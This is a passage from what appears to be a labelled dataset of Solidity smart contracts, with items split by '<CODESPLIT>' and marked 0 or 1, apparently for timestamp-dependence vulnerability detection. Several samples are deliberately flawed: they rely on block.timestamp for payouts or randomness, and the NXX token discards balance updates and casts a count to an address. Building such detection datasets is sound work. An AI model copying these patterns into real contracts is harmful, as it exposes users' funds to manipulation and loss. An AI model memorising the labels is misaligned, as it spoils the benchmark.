if(address(finalizeAgent) != address(0)) {      finalizeAgent.finalizeCrowdsale();    }    finalized = true;  }     function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {    assert(address(addr) != address(0));    assert(address(finalizeAgent) == address(0));    finalizeAgent = addr;         if(!finalizeAgent.isFinalizeAgent()) {      throw;    }  }     function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {    if (!isWhiteListed) throw;    assert(addr != address(0));    assert(maxCap > 0);    assert(minCap <= maxCap);    assert(now <= endsAt);    if (!isAddressWhitelisted(addr)) {      whitelistedParticipants.push(addr);      Whitelisted(addr, status, minCap, maxCap);    } else {      WhitelistItemChanged(addr, status, minCap, maxCap);    }    earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});  }  function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {    if (!isWhiteListed) throw;    assert(now <= endsAt);    assert(addrs.length == statuses.length);    assert(statuses.length == minCaps.length);    assert(minCaps.length == maxCaps.length);    for (uint iterator = 0; iterator < addrs.length; iterator++) {      setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);    }  }  function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {    if (!isWhiteListed) throw;    if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;    uint8 tierPosition = getTierPosition(this);    for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {      CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);      crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);    }  }  function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {    if (!isWhiteListed) throw;    assert(addr != address(0));    assert(now <= endsAt);    assert(isTierJoined(msg.sender));    if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;         uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;    newMaxCap = newMaxCap.minus(tokensBought);    earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});  }  function isAddressWhitelisted(address addr) public constant returns(bool) {    for (uint i = 0; i < whitelistedParticipants.length; i++) {      if (whitelistedParticipants[i] == addr) {        return true;        break;      }    }    return false;  }  function whitelistedParticipantsLength() public constant returns (uint) {    return whitelistedParticipants.length;  }  function isTierJoined(address addr) public constant returns(bool) {    return joinedCrowdsaleState[addr].isJoined;  }  function getTierPosition(address addr) public constant returns(uint8) {    return joinedCrowdsaleState[addr].position;  }  function getLastTier() public constant returns(address) {    if (joinedCrowdsalesLen > 0)      return joinedCrowdsales[joinedCrowdsalesLen - 1];    else      return address(0);  }  function setJoinedCrowdsales(address addr) private onlyOwner {    assert(addr != address(0));    assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);    assert(!isTierJoined(addr));    joinedCrowdsales.push(addr);    joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({      isJoined: true,      position: joinedCrowdsalesLen    });    joinedCrowdsalesLen++;  }  function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {    assert(addrs.length > 0);    assert(joinedCrowdsalesLen == 0);    assert(addrs.length <= joinedCrowdsalesLenMax);    for (uint8 iter = 0; iter < addrs.length; iter++) {      setJoinedCrowdsales(addrs[iter]);    }  }  function setStartsAt(uint time) onlyOwner {    assert(!finalized);    assert(isUpdatable);    assert(now <= time);      assert(time <= endsAt);    assert(now <= startsAt);    CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());    if (lastTierCntrct.finalized()) throw;    uint8 tierPosition = getTierPosition(this);         for (uint8 j = 0; j < tierPosition; j++) {      CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);      assert(time >= crowdsale.endsAt());    }    startsAt = time;    StartsAtChanged(startsAt);  }     function setEndsAt(uint time) public onlyOwner {    assert(!finalized);    assert(isUpdatable);    assert(now <= time);     assert(startsAt <= time);    assert(now <= endsAt);    CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());    if (lastTierCntrct.finalized()) throw;    uint8 tierPosition = getTierPosition(this);    for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {      CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);      assert(time <= crowdsale.startsAt());    }    endsAt = time;    EndsAtChanged(endsAt);  }     function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {    assert(address(_pricingStrategy) != address(0));    assert(address(pricingStrategy) == address(0));    pricingStrategy = _pricingStrategy;         if(!pricingStrategy.isPricingStrategy()) {      throw;    }  }     function setMultisig(address addr) public onlyOwner {         if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {      throw;    }    multisigWallet = addr;  }     function isMinimumGoalReached() public constant returns (bool reached) {    return weiRaised >= minimumFundingGoal;  }     function isFinalizerSane() public constant returns (bool sane) {    return finalizeAgent.isSane();  }     function isPricingSane() public constant returns (bool sane) {    return pricingStrategy.isSane(address(this));  }     function getState() public constant returns (State) {    if(finalized) return State.Finalized;    else if (address(finalizeAgent) == 0) return State.Preparing;    else if (!finalizeAgent.isSane()) return State.Preparing;    else if (!pricingStrategy.isSane(address(this))) return State.Preparing;    else if (block.timestamp < startsAt) return State.PreFunding;    else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;    else if (isMinimumGoalReached()) return State.Success;    else return State.Failure;  }     function isCrowdsale() public constant returns (bool) {    return true;  }              modifier inState(State state) {    if(getState() != state) throw;    _;  }              function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);  function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);     function isCrowdsaleFull() public constant returns (bool);     function assignTokens(address receiver, uint tokenAmount) private;}   
0<CODESPLIT>contract StandardToken is ERC20, SafeMath {     event Minted(address receiver, uint amount);     mapping(address => uint) balances;     mapping (address => mapping (address => uint)) allowed;     function isToken() public constant returns (bool weAre) {    return true;  }  function transfer(address _to, uint _value) returns (bool success) {    balances[msg.sender] = safeSub(balances[msg.sender], _value);    balances[_to] = safeAdd(balances[_to], _value);    Transfer(msg.sender, _to, _value);    return true;  }  function transferFrom(address _from, address _to, uint _value) returns (bool success) {    uint _allowance = allowed[_from][msg.sender];    balances[_to] = safeAdd(balances[_to], _value);    balances[_from] = safeSub(balances[_from], _value);    allowed[_from][msg.sender] = safeSub(_allowance, _value);    Transfer(_from, _to, _value);    return true;  }  function balanceOf(address _owner) constant returns (uint balance) {    return balances[_owner];  }  function approve(address _spender, uint _value) returns (bool success) {                        if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;    allowed[msg.sender][_spender] = _value;    Approval(msg.sender, _spender, _value);    return true;  }  function allowance(address _owner, address _spender) constant returns (uint remaining) {    return allowed[_owner][_spender];  }}   
0<CODESPLIT>contract UpgradeAgent {  uint public originalSupply;     function isUpgradeAgent() public constant returns (bool) {    return true;  }  function upgradeFrom(address _from, uint256 _value) public;} 
0<CODESPLIT>contract UpgradeableToken is StandardToken {     address public upgradeMaster;     UpgradeAgent public upgradeAgent;     uint256 public totalUpgraded;     enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}     event Upgrade(address indexed _from, address indexed _to, uint256 _value);     event UpgradeAgentSet(address agent);     function UpgradeableToken(address _upgradeMaster) {    upgradeMaster = _upgradeMaster;  }     function upgrade(uint256 value) public {      UpgradeState state = getUpgradeState();      if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {                 throw;      }             if (value == 0) throw;      balances[msg.sender] = safeSub(balances[msg.sender], value);             totalSupply = safeSub(totalSupply, value);      totalUpgraded = safeAdd(totalUpgraded, value);             upgradeAgent.upgradeFrom(msg.sender, value);      Upgrade(msg.sender, upgradeAgent, value);  }     function setUpgradeAgent(address agent) external {      if(!canUpgrade()) {                 throw;      }      if (agent == 0x0) throw;             if (msg.sender != upgradeMaster) throw;             if (getUpgradeState() == UpgradeState.Upgrading) throw;      upgradeAgent = UpgradeAgent(agent);             if(!upgradeAgent.isUpgradeAgent()) throw;             if (upgradeAgent.originalSupply() != totalSupply) throw;      UpgradeAgentSet(upgradeAgent);  }     function getUpgradeState() public constant returns(UpgradeState) {    if(!canUpgrade()) return UpgradeState.NotAllowed;    else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;    else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;    else return UpgradeState.Upgrading;  }     function setUpgradeMaster(address master) public {      if (master == 0x0) throw;      if (msg.sender != upgradeMaster) throw;      upgradeMaster = master;  }     function canUpgrade() public constant returns(bool) {     return true;  }}  
0<CODESPLIT>contract ReleasableToken is ERC20, Ownable {     address public releaseAgent;     bool public released = false;     mapping (address => bool) public transferAgents;     modifier canTransfer(address _sender) {    if(!released) {        if(!transferAgents[_sender]) {            throw;        }    }    _;  }     function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {         releaseAgent = addr;  }     function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {    transferAgents[addr] = state;  }     function releaseTokenTransfer() public onlyReleaseAgent {    released = true;  }     modifier inReleaseState(bool releaseState) {    if(releaseState != released) {        throw;    }    _;  }     modifier onlyReleaseAgent() {    if(msg.sender != releaseAgent) {        throw;    }    _;  }  function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {        return super.transfer(_to, _value);  }  function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {         return super.transferFrom(_from, _to, _value);  }}  
0<CODESPLIT>contract MintableTokenExt is StandardToken, Ownable {  using SafeMathLibExt for uint;  bool public mintingFinished = false;     mapping (address => bool) public mintAgents;  event MintingAgentChanged(address addr, bool state  );     struct ReservedTokensData {    uint inTokens;    uint inPercentageUnit;    uint inPercentageDecimals;    bool isReserved;    bool isDistributed;  }  mapping (address => ReservedTokensData) public reservedTokensList;  address[] public reservedTokensDestinations;  uint public reservedTokensDestinationsLen = 0;  bool reservedTokensDestinationsAreSet = false;  modifier onlyMintAgent() {         if(!mintAgents[msg.sender]) {        throw;    }    _;  }     modifier canMint() {    if(mintingFinished) throw;    _;  }  function finalizeReservedAddress(address addr) public onlyMintAgent canMint {    ReservedTokensData storage reservedTokensData = reservedTokensList[addr];    reservedTokensData.isDistributed = true;  }  function isAddressReserved(address addr) public constant returns (bool isReserved) {    return reservedTokensList[addr].isReserved;  }  function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {    return reservedTokensList[addr].isDistributed;  }  function getReservedTokens(address addr) public constant returns (uint inTokens) {    return reservedTokensList[addr].inTokens;  }  function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {    return reservedTokensList[addr].inPercentageUnit;  }  function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {    return reservedTokensList[addr].inPercentageDecimals;  }  function setReservedTokensListMultiple(    address[] addrs,     uint[] inTokens,     uint[] inPercentageUnit,     uint[] inPercentageDecimals  ) public canMint onlyOwner {    assert(!reservedTokensDestinationsAreSet);    assert(addrs.length == inTokens.length);    assert(inTokens.length == inPercentageUnit.length);    assert(inPercentageUnit.length == inPercentageDecimals.length);    for (uint iterator = 0; iterator < addrs.length; iterator++) {      if (addrs[iterator] != address(0)) {        setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);      }    }    reservedTokensDestinationsAreSet = true;  }     function mint(address receiver, uint amount) onlyMintAgent canMint public {    totalSupply = totalSupply.plus(amount);    balances[receiver] = balances[receiver].plus(amount);              Transfer(0, receiver, amount);  }     function setMintAgent(address addr, bool state) onlyOwner canMint public {    mintAgents[addr] = state;    MintingAgentChanged(addr, state);  }  function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {    assert(addr != address(0));    if (!isAddressReserved(addr)) {      reservedTokensDestinations.push(addr);      reservedTokensDestinationsLen++;    }    reservedTokensList[addr] = ReservedTokensData({      inTokens: inTokens,       inPercentageUnit: inPercentageUnit,       inPercentageDecimals: inPercentageDecimals,      isReserved: true,      isDistributed: false    });  }} 
0<CODESPLIT>contract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {     event UpdatedTokenInformation(string newName, string newSymbol);  event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);  string public name;  string public symbol;  uint public decimals;     uint public minCap;     function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)    UpgradeableToken(msg.sender) {                   owner = msg.sender;    name = _name;    symbol = _symbol;    totalSupply = _initialSupply;    decimals = _decimals;    minCap = _globalMinCap;         balances[owner] = totalSupply;    if(totalSupply > 0) {      Minted(owner, totalSupply);    }         if(!_mintable) {      mintingFinished = true;      if(totalSupply == 0) {        throw;        }    }  }     function releaseTokenTransfer() public onlyReleaseAgent {    mintingFinished = true;    super.releaseTokenTransfer();  }     function canUpgrade() public constant returns(bool) {    return released && super.canUpgrade();  }     function setTokenInformation(string _name, string _symbol) onlyOwner {    name = _name;    symbol = _symbol;    UpdatedTokenInformation(name, symbol);  }     function claimTokens(address _token) public onlyOwner {    require(_token != address(0));    ERC20 token = ERC20(_token);    uint balance = token.balanceOf(this);    token.transfer(owner, balance);    ClaimedTokens(_token, owner, balance);  }} 
0<CODESPLIT>contract ReservedTokensFinalizeAgent is FinalizeAgent {  using SafeMathLibExt for uint;  CrowdsaleTokenExt public token;  CrowdsaleExt public crowdsale;  uint public distributedReservedTokensDestinationsLen = 0;  function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {    token = _token;    crowdsale = _crowdsale;  }     function isSane() public constant returns (bool) {    return (token.releaseAgent() == address(this));  }     function distributeReservedTokens(uint reservedTokensDistributionBatch) public {    assert(msg.sender == address(crowdsale));    assert(reservedTokensDistributionBatch > 0);    assert(!reservedTokensAreDistributed);    assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());         uint tokensSold = 0;    for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {      CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));      tokensSold = tokensSold.plus(tier.tokensSold());    }    uint startLooping = distributedReservedTokensDestinationsLen;    uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);    if (batch >= reservedTokensDistributionBatch) {      batch = reservedTokensDistributionBatch;    }    uint endLooping = startLooping + batch;         for (uint j = startLooping; j < endLooping; j++) {      address reservedAddr = token.reservedTokensDestinations(j);      if (!token.areTokensDistributedForAddress(reservedAddr)) {        uint allocatedBonusInPercentage;        uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);        uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);        uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);        if (percentsOfTokensUnit > 0) {          allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;          token.mint(reservedAddr, allocatedBonusInPercentage);        }        if (allocatedBonusInTokens > 0) {          token.mint(reservedAddr, allocatedBonusInTokens);        }        token.finalizeReservedAddress(reservedAddr);        distributedReservedTokensDestinationsLen++;      }    }    if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {      reservedTokensAreDistributed = true;    }  }     function finalizeCrowdsale() public {    assert(msg.sender == address(crowdsale));    if (token.reservedTokensDestinationsLen() > 0) {      assert(reservedTokensAreDistributed);    }    token.releaseTokenTransfer();  }}
0<CODESPLIT>contract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {     uint public maximumSellableTokens;  function MintedTokenCappedCrowdsaleExt(    string _name,     address _token,     PricingStrategy _pricingStrategy,     address _multisigWallet,     uint _start, uint _end,     uint _minimumFundingGoal,     uint _maximumSellableTokens,     bool _isUpdatable,     bool _isWhiteListed  ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {    maximumSellableTokens = _maximumSellableTokens;  }     event MaximumSellableTokensChanged(uint newMaximumSellableTokens);     function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {    return tokensSoldTotal > maximumSellableTokens;  }  function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {    assert(isWhiteListed);    uint maxCap = earlyParticipantWhitelist[addr].maxCap;    return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;  }  function isCrowdsaleFull() public constant returns (bool) {    return tokensSold >= maximumSellableTokens;  }  function setMaximumSellableTokens(uint tokens) public onlyOwner {    assert(!finalized);    assert(isUpdatable);    assert(now <= startsAt);    CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());    assert(!lastTierCntrct.finalized());    maximumSellableTokens = tokens;    MaximumSellableTokensChanged(maximumSellableTokens);  }  function updateRate(uint newOneTokenInWei) public onlyOwner {    assert(!finalized);    assert(isUpdatable);    assert(now <= startsAt);    CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());    assert(!lastTierCntrct.finalized());    pricingStrategy.updateRate(newOneTokenInWei);  }     function assignTokens(address receiver, uint tokenAmount) private {    MintableTokenExt mintableToken = MintableTokenExt(token);    mintableToken.mint(receiver, tokenAmount);  }}
0<CODESPLIT>contract TimeBank {    struct Holder {        uint withdrawTime;    }    mapping (address => Holder) holders;    function withdrawFunds() {        require(holders[msg.sender].withdrawTime < block.timestamp);        holders[msg.sender].withdrawTime = 0;        return;    }}
0<CODESPLIT>contract Pausable is Ownable {	event Pause();	event Unpause();	bool public paused = false;	 	modifier whenNotPaused() {		require(!paused);		_;	}	 	modifier whenPaused {		require(paused);		_;	}	 	function pause() onlyOwner whenNotPaused public returns (bool) {		paused = true;		emit Pause();		return true;	}	 	function unpause() onlyOwner whenPaused public returns (bool) {		paused = false;		emit Unpause();		return true;	}} library SafeMath {     function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {    if (a == 0) {      return 0;    }    c = a * b;    assert(c / a == b);    return c;  }     function div(uint256 a, uint256 b) internal pure returns (uint256) {                   return a / b;  }     function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }     function add(uint256 a, uint256 b) internal pure returns (uint256 c) {    c = a + b;    assert(c >= a);    return c;  }}library ContractLib {	 	function isContract(address _addr) internal view returns (bool) {		uint length;		assembly {			 			length := extcodesize(_addr)		}		return (length>0);	}}  
0<CODESPLIT>contract ContractReceiver {	function tokenFallback(address _from, uint _value, bytes _data) public pure;}    
0<CODESPLIT>contract ERC20Interface {	function totalSupply() public constant returns (uint);	function balanceOf(address tokenOwner) public constant returns (uint);	function allowance(address tokenOwner, address spender) public constant returns (uint);	function transfer(address to, uint tokens) public returns (bool);	function approve(address spender, uint tokens) public returns (bool);	function transferFrom(address from, address to, uint tokens) public returns (bool);	function name() public constant returns (string);	function symbol() public constant returns (string);	function decimals() public constant returns (uint8);	event Transfer(address indexed from, address indexed to, uint tokens);	event Approval(address indexed tokenOwner, address indexed spender, uint tokens);}      
0<CODESPLIT>contract ERC223 is ERC20Interface {	function transfer(address to, uint value, bytes data) public returns (bool);		event Transfer(address indexed from, address indexed to, uint tokens);	event Transfer(address indexed from, address indexed to, uint value, bytes data);} 
1<CODESPLIT>contract NXX is ERC223, Pausable {	using SafeMath for uint256;	using ContractLib for address;	mapping(address => uint) balances;	mapping(address => mapping(address => uint)) allowed;		string public name;	string public symbol;	uint8 public decimals;	uint256 public totalSupply;	event Burn(address indexed from, uint256 value);		 	 	 	function NXX() public {		symbol = "NASHXX";		name = "XXXX CASH";		decimals = 18;		totalSupply = 100000000000 * 10**uint(decimals);		balances[msg.sender] = totalSupply;		emit Transfer(address(0), msg.sender, totalSupply);	}			 	function name() public constant returns (string) {		return name;	}	 	function symbol() public constant returns (string) {		return symbol;	}	 	function decimals() public constant returns (uint8) {		return decimals;	}	 	function totalSupply() public constant returns (uint256) {		return totalSupply;	}		 	function transfer(address _to, uint _value, bytes _data) public whenNotPaused returns (bool) {		require(_to != 0x0);		if(_to.isContract()) {			return transferToContract(_to, _value, _data);		}		else {			return transferToAddress(_to, _value, _data);		}	}		 	 	function transfer(address _to, uint _value) public whenNotPaused returns (bool) {		 		 		require(_to != 0x0);		bytes memory empty;		if(_to.isContract()) {			return transferToContract(_to, _value, empty);		}		else {			return transferToAddress(_to, _value, empty);		}	}	 	function transferToAddress(address _to, uint _value, bytes _data) private returns (bool) {		balances[msg.sender] = balanceOf(msg.sender).sub(_value);		balances[_to] = balanceOf(_to).add(_value);		emit Transfer(msg.sender, _to, _value);		emit Transfer(msg.sender, _to, _value, _data);		return true;	}	     function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {	    balances[msg.sender] = balanceOf(msg.sender).sub(_value);	    balances[_to] = balanceOf(_to).add(_value);	    ContractReceiver receiver = ContractReceiver(_to);	    receiver.tokenFallback(msg.sender, _value, _data);	    emit Transfer(msg.sender, _to, _value);	    emit Transfer(msg.sender, _to, _value, _data);	    return true;	}		function balanceOf(address _owner) public constant returns (uint) {		return balances[_owner];	}  	function burn(uint256 _value) public whenNotPaused returns (bool) {		require (_value > 0); 		require (balanceOf(msg.sender) >= _value);             		balances[msg.sender] = balanceOf(msg.sender).sub(_value);                       		totalSupply = totalSupply.sub(_value);                                 		emit Burn(msg.sender, _value);		return true;	}	 	 	 	 	 	 	 	 	function approve(address spender, uint tokens) public whenNotPaused returns (bool) {		allowed[msg.sender][spender] = tokens;		emit Approval(msg.sender, spender, tokens);		return true;	}	function increaseApproval (address _spender, uint _addedValue) public whenNotPaused	    returns (bool success) {	    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);	    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);	    return true;	}	function decreaseApproval (address _spender, uint _subtractedValue) public whenNotPaused	    returns (bool success) {	    uint oldValue = allowed[msg.sender][_spender];	    if (_subtractedValue > oldValue) {	      allowed[msg.sender][_spender] = 0;	    } else {	      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);	    }	    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);	    return true;	}		 	 	 	 	 	 	 	 	 	function transferFrom(address from, address to, uint tokens) public whenNotPaused returns (bool) {		allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);		balances[from] = balances[from].sub(tokens);		balances[to] = balances[to].add(tokens);		emit Transfer(from, to, tokens);		return true;	}	 	 	 	 	function allowance(address tokenOwner, address spender) public constant returns (uint) {		return allowed[tokenOwner][spender];	}	 	 	 	function () public payable {		revert();	}	 	 	 	function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool) {		return ERC20Interface(tokenAddress).transfer(owner, tokens);	}	 	address[] supportedERC20Token;	mapping (address => uint256) prices;	mapping (address => uint256) starttime;	mapping (address => uint256) endtime;	uint256 maxTokenCountPerTrans = 10000;	uint256 nashInPool;	event AddSupportedToken(		address _address, 		uint256 _price, 		uint256 _startTime, 		uint256 _endTime);	event RemoveSupportedToken(		address _address	);	function addSupportedToken(		address _address, 		uint256 _price, 		uint256 _startTime, 		uint256 _endTime	) public onlyOwner returns (bool) {				require(_address != 0x0);		require(_address.isContract());		require(_startTime < _endTime);		require(_endTime > block.timestamp);		supportedERC20Token.push(_address);		prices[_address] = _price;		starttime[_address] = _startTime;		endtime[_address] = _endTime;		emit AddSupportedToken(_address, _price, _startTime, _endTime);		return true;	}	function removeSupportedToken(address _address) public onlyOwner returns (bool) {		require(_address != 0x0);		uint256 length = supportedERC20Token.length;		for (uint256 i = 0; i < length; i++) {			if (supportedERC20Token[i] == _address) {				if (i != length - 1) {					supportedERC20Token[i] = supportedERC20Token[length - 1];				}                delete supportedERC20Token[length-1];				supportedERC20Token.length--;				prices[_address] = 0;				starttime[_address] = 0;				endtime[_address] = 0;				emit RemoveSupportedToken(_address);				break;			}		}		return true;	}	modifier canBuy(address _address) { 		bool found = false;		uint256 length = supportedERC20Token.length;		for (uint256 i = 0; i < length; i++) {			if (supportedERC20Token[i] == _address) {				require(block.timestamp > starttime[_address]);				require(block.timestamp < endtime[_address]);				found = true;				break;			}		}				require (found); 		_; 	}	function joinPreSale(address _tokenAddress, uint256 _tokenCount) public canBuy(_tokenAddress) returns (bool) {		require(_tokenCount <= maxTokenCountPerTrans); 		uint256 total = _tokenCount * prices[_tokenAddress];  		balances[msg.sender].sub(total);		nashInPool.add(total);		emit Transfer(_tokenAddress, this, total);		return ERC20Interface(_tokenCount).transfer(msg.sender, _tokenCount);	}	function transferNashOut(address _to, uint256 count) public onlyOwner returns(bool) {		require(_to != 0x0);		nashInPool.sub(count);		balances[_to].add(count);		emit Transfer(this, _to, count);	}}
1<CODESPLIT>contract Serpent {	mapping (address => uint256) public investorReturn;	uint256 public SerpentCountDown;	function CollectReturns () external {		uint256 currentTime = uint256(block.timestamp);		require (currentTime > SerpentCountDown);		investorReturn[msg.sender] = 0;		return;	}}
1<CODESPLIT>contract ChibiFighters {    struct Chibi {        uint16[13] dna;        uint256 father;        uint256 mother;    }    Chibi[] public chibies;    function traits(uint16[13] memory genes, uint _seed, uint _fatherId) internal view returns (uint16[13] memory) {        uint _switch = uint136(keccak256(_seed, block.coinbase, block.timestamp)) % 5;        if (_switch == 0) {            genes[10] = chibies[_fatherId].dna[10];        }        return genes;    }}
1<CODESPLIT>contract ProgressiveIndividualCappedCrowdsale {    uint public startGeneralSale;    uint public constant TIME_PERIOD_IN_SEC = 1 days;    uint256 public baseEthCapPerAddress;    function getCurrentEthCapPerAddress() public constant returns(uint) {        uint time = block.timestamp;        uint timeSinceStartInSec = time - (startGeneralSale);        uint currentPeriod = timeSinceStartInSec / (TIME_PERIOD_IN_SEC) + (1);        return 2 ** currentPeriod;    }}
1<CODESPLIT>contract Goo {    mapping(address => uint256) private lastGooSaveTime;    function balanceOfUnclaimedGoo(address player) internal constant returns (uint256) {        uint256 lastSave = lastGooSaveTime[player];        if (lastSave > 0 && lastSave < 100) {            return (1000 * (block.timestamp - lastSave)) / 100;        }        return 0;    }}
1<CODESPLIT>contract TimeSource {  uint32 private mockNow;  function currentTime() public constant returns (uint32) {    return mockNow > 0 ? mockNow : uint32(block.timestamp);  }}
0<CODESPLIT>contract WhitelistCrowdsale {  mapping(address => bool) whitelisted;  uint256 public whitelistedCount;  function addAddress(address _addr) external {    whitelisted[_addr] = true;    whitelistedCount = block.timestamp;    return;  }}
1<CODESPLIT>contract Infocash{    function blockTime() constant returns (uint32) {        return uint32(block.timestamp);    }}
0<CODESPLIT>contract BulletinBoard {    struct Message {        address sender;        string text;        uint timestamp;        uint payment;    }    Message[] public messages;    address public owner;    constructor() public {        owner = msg.sender;    }    function addMessage(string text) public payable {        require(msg.value >= 0.000001 ether * bytes(text).length);        messages.push(Message(msg.sender, text, block.timestamp, msg.value));    }    function numMessages() public constant returns (uint) {        return messages.length;    }    function withdraw() public {        require(msg.sender == owner);        msg.sender.transfer(address(this).balance);    }}
0<CODESPLIT>contract FsTKAuthority {  function isAuthorized(address sender, address _contract, bytes data) public view returns (bool);  function isApproved(bytes32 hash, uint256 approveTime, bytes approveToken) public view returns (bool);  function validate() public pure returns (bytes4);}
0<CODESPLIT>contract Authorizable {  event SetFsTKAuthority(FsTKAuthority indexed _address);  modifier onlyFsTKAuthorized {    require(fstkAuthority.isAuthorized(msg.sender, this, msg.data));    _;  }  modifier onlyFsTKApproved(bytes32 hash, uint256 approveTime, bytes approveToken) {    require(fstkAuthority.isApproved(hash, approveTime, approveToken));    _;  }  FsTKAuthority internal fstkAuthority;  constructor(FsTKAuthority _fstkAuthority) internal {    fstkAuthority = _fstkAuthority;  }  function setFsTKAuthority(FsTKAuthority _fstkAuthority) public onlyFsTKAuthorized {    require(_fstkAuthority.validate() == _fstkAuthority.validate.selector);    emit SetFsTKAuthority(fstkAuthority = _fstkAuthority);  }}
0<CODESPLIT>contract SecureERC20 is ERC20 {  event SetERC20ApproveChecking(bool approveChecking);  function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool);  function increaseAllowance(address spender, uint256 value) public returns (bool);  function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool);  function setERC20ApproveChecking(bool approveChecking) public;}
0<CODESPLIT>contract FsTKToken {  event Consume(address indexed from, uint256 value, bytes32 challenge);  event IncreaseNonce(address indexed from, uint256 nonce);  event SetupDirectDebit(address indexed debtor, address indexed receiver, DirectDebitInfo info);  event TerminateDirectDebit(address indexed debtor, address indexed receiver);  event WithdrawDirectDebitFailure(address indexed debtor, address indexed receiver);  event SetMetadata(string metadata);  event SetLiquid(bool liquidity);  event SetDelegate(bool isDelegateEnable);  event SetDirectDebit(bool isDirectDebitEnable);  struct DirectDebitInfo {    uint256 amount;    uint256 startTime;    uint256 interval;  }  struct DirectDebit {    DirectDebitInfo info;    uint256 epoch;  }  struct Instrument {    uint256 allowance;    DirectDebit directDebit;  }  struct Account {    uint256 balance;    uint256 nonce;    mapping (address => Instrument) instruments;  }  function spendableAllowance(address owner, address spender) public view returns (uint256);  function transfer(uint256[] data) public returns (bool);  function transferAndCall(address to, uint256 value, bytes data) public payable returns (bool);  function nonceOf(address owner) public view returns (uint256);  function increaseNonce() public returns (bool);  function delegateTransferAndCall(    uint256 nonce,    uint256 fee,    address to,    uint256 value,    bytes data,    address delegator,    uint8 v,    bytes32 r,    bytes32 s  ) public returns (bool);  function directDebit(address 